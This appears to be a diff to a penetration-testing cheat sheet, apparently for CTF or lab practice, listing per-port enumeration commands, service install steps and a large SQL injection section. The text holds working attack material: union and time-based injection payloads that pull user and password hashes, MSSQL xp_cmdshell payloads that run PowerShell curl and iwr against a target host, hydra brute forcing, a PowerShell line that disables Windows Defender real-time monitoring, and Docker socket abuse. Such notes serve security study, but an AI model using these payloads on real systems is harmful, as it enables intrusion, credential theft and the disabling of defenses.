@@ -15,10 +15,20 @@ $ wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
 ### Port 22 (SSH)
 
 ```bash
+=> Install
+$ sudo apt install openssh-server
+
 => Commands
 $ ssh root@10.10.10.10
 $ ssh root@10.10.10.10 -i id_rsa
 
+=> Service
+$ sudo systemctl status ssh
+$ sudo systemctl enable ssh
+$ sudo systemctl start ssh
+
+=> References
+$ https://www.cyberciti.biz/faq/ubuntu-linux-install-openssh-server/
 ```
 
 ### Port 25 (SMTP)
@@ -52,7 +62,22 @@ $ nslookup 10.10.10.10
 $ host -t ns megacorpone.com
 ```
 
-### 88 (Kerberos)
+### Port 80 (Http)
+
+```bash
+=> Install Apache2
+$ sudo apt install apache2
+
+=> Service
+$ sudo systemctl status apache2
+$ sudo systemctl enable apache2
+$ sudo systemctl start apache2
+
+=> References
+$ https://www.digitalocean.com/community/tutorials/how-to-install-the-apache-web-server-on-ubuntu-20-04
+```
+
+### Port 88 (Kerberos)
 
 ```bash
 => Nmap
@@ -111,9 +136,21 @@ $ queryuser 500
 $ querydispinfo
 ```
 
-### 139,445 (SMB)
+### Port 139,445 (SMB)
 
 ```bash
+=> Install
+$ sudo apt install samba
+
+=> Service
+$ sudo systemctl status smbd
+$ sudo systemctl start smbd
+$ sudo systemctl stop smbd
+
+=> Configuration file
+$ /etc/samba/smb.conf
+$ sudo smbpasswd -a username
+
 => Nmap
 $ nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
 $ nmap --script smb-vuln* -p 137,139,445 10.10.10.10
@@ -145,175 +182,209 @@ $ enum4linux 10.10.10.10
 $ enum4linux -u "user" -p "password" -a 10.10.10.10
 $ for i in $(cat list.txt); do enum4linux -a $i;done
 
+=> References
+$ https://ubuntu.com/tutorials/install-and-configure-samba
 ```
 
 ### 143,993 (IMAP)
 
 ```bash
-# Nmap
-nmap -sV --script imap-brute -p 143 10.10.10.10
+=> Nmap
+$ nmap -sV --script imap-brute -p 143 10.10.10.10
 ```
 
 ### 161,162 (SNMP - UDP)
 
 ```bash
-# Install
-pip install snmpclitools
+=> Install
+$ pip install snmpclitools
 
-# Snmp-check
-snmp-check 10.10.10.10 -c public
+=> Snmp-check
+$ snmp-check 10.10.10.10 -c public
 
-# Snmpwalk
-snmpwalk -v1 -c public 10.10.10.10
-snmpwalk -c public 10.10.10.10
-snmpwalk -v1 -c public 10.10.10.10 1
-snmpwalk -v1 -c public 10.10.10.10 2
+=> Snmpwalk
+$ snmpwalk -v1 -c public 10.10.10.10
+$ snmpwalk -c public 10.10.10.10
+$ snmpwalk -v1 -c public 10.10.10.10 1
+$ snmpwalk -v1 -c public 10.10.10.10 2
 
-# Onesixtyone
-onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
+=> Onesixtyone
+$ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 ```
 
 ### 636 (LDAP)
 
 ```bash
-# Nmap
-nmap -n -sV --script "ldap* and not brute" 10.10.10.10
+=> Nmap
+$ nmap -n -sV --script "ldap* and not brute" 10.10.10.10
 
-# LdapSearch
-ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
-ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
-ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
-ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
-ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
+=> LdapSearch
+$ ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
+$ ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
+$ ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+$ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+$ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
 
 ```
 
 ### 873 (Rsync)
 
 ```bash
-# Nmap
-nmap -sV --script "rsync-list-modules" -p 873 10.10.10.10
+=> Nmap
+$ nmap -sV --script "rsync-list-modules" -p 873 10.10.10.10
 
-# Command
-rsync -av --list-only rsync://10.10.10.10/Modules
-rsync -av rsync://10.10.10.101/Conf ./shared
-rsync -av ./test.txt rsync://10.10.10.10/Modules/test.txt
+=> Command
+$ rsync -av --list-only rsync://10.10.10.10/Modules
+$ rsync -av rsync://10.10.10.101/Conf ./shared
+$ rsync -av ./test.txt rsync://10.10.10.10/Modules/test.txt
 
-# References
-https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
+=> References
+$ https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 ```
 
 ### 1433 (MSSQL)
 
 ```code
-# Commands
-SELECT @@version
-SELECT DB_NAME()
-SELECT name FROM master..sysdatabases;
+=> Commands
+$ SELECT @@version
+$ SELECT DB_NAME()
+$ SELECT name FROM master..sysdatabases;
 
-# Enable xp_cmdshell
-sp_configure 'show advanced options', '1'
-RECONFIGURE
-sp_configure 'xp_cmdshell', '1'
-RECONFIGURE
-EXEC master..xp_cmdshell 'whoami'
+=> Enable xp_cmdshell
+$ sp_configure 'show advanced options', '1'
+$ RECONFIGURE
+$ sp_configure 'xp_cmdshell', '1'
+$ RECONFIGURE
+$ EXEC master..xp_cmdshell 'whoami'
 
-# Convert
-select convert(varchar(100),0X54455354);
+=> Convert
+$ select convert(varchar(100),0X54455354);
 
-# sqsh
-sqsh -U sa -P password -S 10.10.10.10
+=> sqsh
+$ sqsh -U sa -P password -S 10.10.10.10
 	* EXEC master..xp_cmdshell 'whoami'
 	* go
 	
-# References
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+=> References
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 ```
 
 ### 2049 (NFS MOUNT)
 
 ```bash
-# Nmap
-nmap -sV --script=nfs-showmount <target>
+=> Nmap
+$ nmap -sV --script=nfs-showmount <target>
 
-# Showmount
-showmount -e 10.10.10.10
+=> Showmount
+$ showmount -e 10.10.10.10
 
-# Mount
-mount -t nfs 10.10.10.10:/home mnt
-mount -o vers=3 -t nfs 10.10.10.10:/home mnt
+=> Mount
+$ mount -t nfs 10.10.10.10:/home mnt
+$ mount -o vers=3 -t nfs 10.10.10.10:/home mnt
 ```
 
 ### 3128 (SQUID PROXY)
 
 ```bash
+=> Ffuf
+$ ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -x http://10.10.10.10:3128
 
-# Ffuf
-ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -x http://10.10.10.10:3128
-
-# proxychains
-echo "http 10.10.10.10 3128" >> /etc/proxychains.conf
+=> proxychains
+$ echo "http 10.10.10.10 3128" >> /etc/proxychains.conf
 	* proxychains ssh john@10.10.10.10
 ```
 
 ### 3306 (MYSQL)
 
 ```bash
-# Commands
-mysql -u root -p -h 10.10.10.10
-mysql -u root -pPassword123 -e "use drupal;select * from users"
+=> Commands
+$ mysql -u root -p -h 10.10.10.10
+$ mysql -u root -pPassword123 -e "use drupal;select * from users"
 
-# Bruteforce
-hydra -l nik -p password.txt 10.10.10.10 mysql -t 30 -f
+=> Bruteforce
+$ hydra -l nik -p password.txt 10.10.10.10 mysql -t 30 -f
 
-# Check UDF
-select * from msql.func;
+=> Check UDF
+$ select * from msql.func;
 
-# Mysql Commands
-select sys_exec('whoami');
+=> Mysql Commands
+$ select sys_exec('whoami');
 ```
 
 ### 3389 (RDP)
 
 ```bash
-# Nmap
-nmap -p 3389 --script=rdp-vuln-* 10.10.10.10
+=> Nmap
+$ nmap -p 3389 --script=rdp-vuln-* 10.10.10.10
 
-# Commands
-xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
-xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
-rdesktop -a 16 -z -u admin -p password 10.10.10.10
+=> Commands
+$ xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
+$ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
+$ rdesktop -a 16 -z -u admin -p password 10.10.10.10
 
-# References
-- https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+=> References
+$ https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
 ```
 
 ### 3632 (DISTCC)
 
 ```bash
-# Nmap
-nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='id'"
+=> Nmap
+$ nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='id'"
 
 ```
 
 ### 6379 (REDIS)
 
 ```bash
-# Install
-sudo apt-get install redis-tools
+=> Install
+$ sudo apt-get install redis-tools
 
-# Commands
-redis-cli -h 10.10.10.10
+=> Commands
+$ redis-cli -h 10.10.10.10
 	* keys *
 	* get pk:ids:User
+	* info
+	* client list
+	* CONFIG GET *
 
+=> redis-dump-go
+$ https://github-com.translate.goog/yannh/redis-dump-go
+
+=> Downloads
+$ https://download.redis.io/releases/
+
+=> References
+$ https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+```
+
+### Port 8086 (InfluxDB)
+
+```bash
+=> User Enumeration
+$ http://127.0.0.1:8086/debug/requests
+
+=> Usage
+$ curl -G "http://10.10.10.10:8086/query?pretty=true" -H "Authorization: Bearer <JWT>"  --data-urlencode "q=show databases"
+$ curl -G "http://10.10.10.10:8086/query?pretty=true" -H "Authorization: Bearer <JWT>" --data-urlencode "db=database" --data-urlencode "q=select * from \"tables\""
+$ curl -G "http://10.10.133.227:8086/query?pretty=true" -H "Authorization: Bearer <JWT>" --data-urlencode "db=database" --data-urlencode "q=select * from times" --data-urlencode "epoch=s"
+
+=> Commands
+$ show databases
+$ show measurements
+$ show users
+$ select * from tables
+
+=> References
+$ https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
+$ https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/
 ```
 
 ### 27017,27018 (MONGODB)
 
 ```bash
-# Commands
-mongo localhost:27017/myplace -u nik -p Password123
+=> Commands
+$ mongo localhost:27017/myplace -u nik -p Password123
 	* show dbs
 	* use <db>
 	* show collections
@@ -326,13 +397,13 @@ mongo localhost:27017/myplace -u nik -p Password123
 ### Port Knocking
 
 ```bash
-# Commands
-knocker.py -p 8890,7000,666 10.10.10.10
-for i in 571 290 911;do nmap -n -v0 -Pn --max-retries 0 -p $i 10.10.10.10;done
-knock 10.10.10.10 7000:666:8890
+=> Commands
+$ knocker.py -p 8890,7000,666 10.10.10.10
+$ for i in 571 290 911;do nmap -n -v0 -Pn --max-retries 0 -p $i 10.10.10.10;done
+$ knock 10.10.10.10 7000:666:8890
 
-# Permutation (Port)
-python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]))' | sed 's/), /\\n/g' | tr -cd '0-9,\\n' | sort | uniq > permutation.txt
+=> Permutation (Port)
+$ python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]))' | sed 's/), /\\n/g' | tr -cd '0-9,\\n' | sort | uniq > permutation.txt
 
 ```
 
@@ -340,137 +411,137 @@ python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]
 
 ```bash
 [MYSQL]
-## Get Current Database
-database()
+=> Get Current Database
+$ database()
 
-## Get Database
-UNION SELECT table_schema FROM information_schema.tables
+=> Get Database
+$ UNION SELECT table_schema FROM information_schema.tables
 
-## Get Table Name
-UNION SELECT table_name FROM information_schema.tables WHERE table_schema == "database"
+=> Get Table Name
+$ UNION SELECT table_name FROM information_schema.tables WHERE table_schema == "database"
 
-## Get Column Name
-UNION SELECT table_name, column_name FROM information_schema.columns
+=> Get Column Name
+$ UNION SELECT table_name, column_name FROM information_schema.columns
 
-###===Time Based===
-## Get Database
-(SELECT sleep(5) from dual where substring(database(),1,1)='h') 
-(SELECT sleep(5) from dual where substring(database(),2,1)='h') 
+=> ===Time Based===
+=> Get Database
+$ (SELECT sleep(5) from dual where substring(database(),1,1)='h') 
+$ (SELECT sleep(5) from dual where substring(database(),2,1)='h') 
 
-## Get Tables
-(SELECT sleep(5) from information_schema.tables where table_name LIKE '%hotel%')
+=> Get Tables
+$ (SELECT sleep(5) from information_schema.tables where table_name LIKE '%hotel%')
 
-## Get Columns
-(SELECT sleep(5) from information_schema.columns where column_name LIKE '%room%' AND table_name='hotel')
+=> Get Columns
+$ (SELECT sleep(5) from information_schema.columns where column_name LIKE '%room%' AND table_name='hotel')
 
-## Extract
-IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)
+=> Extract
+$ IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)
 
-## Extra
-(select IF(500>1000, "nothing", sleep(5)))
+=> Extra
+$ (select IF(500>1000, "nothing", sleep(5)))
 
-###===Union Based===
-## Get Database
-9999 union select 1,database(),3,4,5
+=> ===Union Based===
+=> Get Database
+$ 9999 union select 1,database(),3,4,5
 
-## Get Tables
-9999 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema like "%hotel%"
+=> Get Tables
+$ 9999 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema like "%hotel%"
 
-## Get Columns
-9999 union select 1, group_concat(column_name),3,4,5 from information_schema.columns where table_name like "%room%" 
+=> Get Columns
+$ 9999 union select 1, group_concat(column_name),3,4,5 from information_schema.columns where table_name like "%room%" 
 
-## Extract
-9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user
+=> Extract
+$ 9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user
 
-###===Blind===
+=> ===Blind===
 [WHERE]
-' and password like 'k%'--
+$ ' and password like 'k%'--
 
 [ORACLE]
-## Get Current Database
-union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
+=> Get Current Database
+$ union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
 
-## Get All Tables
-' union SELECT table_name,'b',1 FROM all_tables--
+=> Get All Tables
+$ ' union SELECT table_name,'b',1 FROM all_tables--
 
-## Get Columns
-' union SELECT column_name,'b',1 FROM all_tab_columns WHERE table_name = 'TABLE'--
+=> Get Columns
+$ ' union SELECT column_name,'b',1 FROM all_tab_columns WHERE table_name = 'TABLE'--
 
-## Extract
-' union SELECT USERNAME,'b',1 FROM TABLE--
-' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
+=> Extract
+$ ' union SELECT USERNAME,'b',1 FROM TABLE--
+$ ' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
 
 [MSSQL]
-# Payload (Encounter Before)
-A';waitfor delay '0:0:00';--
-' OR 1=1 OR 'A' LIKE 'A
-';EXEC master..xp_cmdshell 'powershell.exe -c curl http://10.10.10.10/';--
-';EXEC master..xp_cmdshell 'powershell.exe -c iwr http://10.10.10.10/';--
+=> Payload (Encounter Before)
+$ A';waitfor delay '0:0:00';--
+$ ' OR 1=1 OR 'A' LIKE 'A
+$ ';EXEC master..xp_cmdshell 'powershell.exe -c curl http://10.10.10.10/';--
+$ ';EXEC master..xp_cmdshell 'powershell.exe -c iwr http://10.10.10.10/';--
 
-# Check File exist  or Not
-### Corect Path
-';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+=> Check File exist  or Not
+=> Corect Path
+$ ';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
-### Wrong Path
-';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win2.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+=> Wrong Path
+$ ';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win2.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
-# Check Directory/Files Exist Or Not
-## Correct
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+=> Check Directory/Files Exist Or Not
+=> Correct
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
-## Wrong
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows2\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+=> Wrong
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows2\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
-# Check Hostname
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((hostname)[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+=> Check Hostname
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((hostname)[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-# Check APPDATA Path
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(($env:APPDATA[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+=> Check APPDATA Path
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(($env:APPDATA[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-# Check Substring 
-## Correct
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+=> Check Substring 
+=> Correct
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-## Wrong
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]66)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+=> Wrong
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]66)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-# Powershell IF ELSE
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ("1" -eq "1") {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+=> Powershell IF ELSE
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ("1" -eq "1") {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (1 -eq 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (1 -eq 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (echo 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (echo 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ( Test-Path C:\ ) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--  
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ( Test-Path C:\ ) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--  
 
-';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(Get-ChildItem -Path C:\){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+$ ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(Get-ChildItem -Path C:\){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
 
 
-# Simple IF ELSE
-';DECLARE @value INT = 1;IF(@value=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+=> Simple IF ELSE
+$ ';DECLARE @value INT = 1;IF(@value=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
-# Payload (Enable xp_cmdshell)
-';sp_configure 'show advanced options', '1';RECONFIGURE;--
-';sp_configure 'xp_cmdshell', '1';RECONFIGURE;--
+=> Payload (Enable xp_cmdshell)
+$ ';sp_configure 'show advanced options', '1';RECONFIGURE;--
+$ ';sp_configure 'xp_cmdshell', '1';RECONFIGURE;--
 
-## Time Based
-;waitfor delay '0:0:10'--
-);waitfor delay '0:0:10'--
-';waitfor delay '0:0:10'--
-');waitfor delay '0:0:10'--
-));waitfor delay '0:0:10'--
+=> Time Based
+$ ;waitfor delay '0:0:10'--
+$ );waitfor delay '0:0:10'--
+$ ';waitfor delay '0:0:10'--
+$ ');waitfor delay '0:0:10'--
+$ ));waitfor delay '0:0:10'--
 
-## References
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
-- https://www.sqlservercentral.com/forums/topic/determining-whether-a-directory-exists-xp_dirtree-xp_subdirs
+=> References
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+$ https://www.sqlservercentral.com/forums/topic/determining-whether-a-directory-exists-xp_dirtree-xp_subdirs
 
 [SQLITE]
-## Command
-sqlite3 databse.db
-.tables
-select * from user;
-.schema user
-UPDATE user SET passwd = "" where id 2;
+=> Command
+$ sqlite3 databse.db
+$ .tables
+$ select * from user;
+$ .schema user
+$ UPDATE user SET passwd = "" where id 2;
 ```
 
 ### GraphQL Injection
@@ -747,6 +818,22 @@ socat tcp-listen:8009,fork tcp:192.168.56.104:8009 &
 socat tcp-listen:8080,fork tcp:192.168.56.104:8080 &
 socat tcp-listen:34483,fork tcp:192.168.56.104:34483 &
 socat tcp-listen:4321,fork tcp:192.168.56.104:4321 &
+```
+
+### PyJWT
+
+```bash
+=> Install
+$ pip install PyJWT
+
+=> Commands
+$ import jwt
+$ encoded = jwt.encode({"username": "o5yY6yya", "exp" : 1690896507}, "", algorithm="HS256")
+$ encoded
+
+=> References
+$ https://github.com/jpadilla/pyjwt
+$ https://www.epochconverter.com/
 ```
 
 ### tcpdump
@@ -1257,13 +1344,27 @@ $ https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 
 => SQL Injection
 $ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+$ https://owasp.org/www-community/attacks/SQL_Injection
+$ https://portswigger.net/web-security/sql-injection
 
 => Sensitive Information
 $ https://cwe.mitre.org/data/definitions/200.html
 $ https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
 $ https://cwe.mitre.org/data/definitions/359.html
 $ https://cyberintelligencehouse.com/exposure/disclosure-of-sensitive-information-and-exposure-enables-phishing
+$ https://portswigger.net/web-security/information-disclosure
 
+=> Zip Password
+$ https://github.com/jingleyang/security_ctf/blob/master/hacking-lab.com/5020%20Password%20protected%20ZIP%20Writeup.md
+
+=> Local File Inclusion (LFI)
+$ https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+$ https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
+$ https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/
+
+=> Source Code Disclosure
+$ https://portswigger.net/kb/issues/006000b0_source-code-disclosure
+$ https://www.acunetix.com/blog/articles/source-code-disclosure-dangerous/
 ```
 
 ### PowerShell Commands
@@ -1285,6 +1386,9 @@ Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue 
 # Search content recursively
 Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "flag" | group path | select name
 Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "password" | group path | select name
+
+# Search Content
+(Get-ChildItem C:\Users).Count
 
 # Disable Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -2238,12 +2342,24 @@ cat file.mbox
 ### Docker
 
 ```bash
-# Commands
-docker images
-docker pull ubuntu
-docker run -it ubuntu
-docker run -it <image_id>
-docker build /path_to_Dockerfile/
+=> Commands
+$ docker images
+$ docker pull ubuntu
+$ docker run -it ubuntu
+$ docker run -it <image_id>
+$ docker build /path_to_Dockerfile/
+
+=> Curl 
+$ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json"
+$ curl -s localhost:8080/images/json -H "Content-Type: application/json"
+
+=> Api
+$ /images/json
+$ /container/json
+
+=> References
+$ https://securityboulevard.com/2019/02/abusing-docker-api-socket/
+$ https://github.com/flast101/docker-privesc
 ```
 
 ### Dockerfile
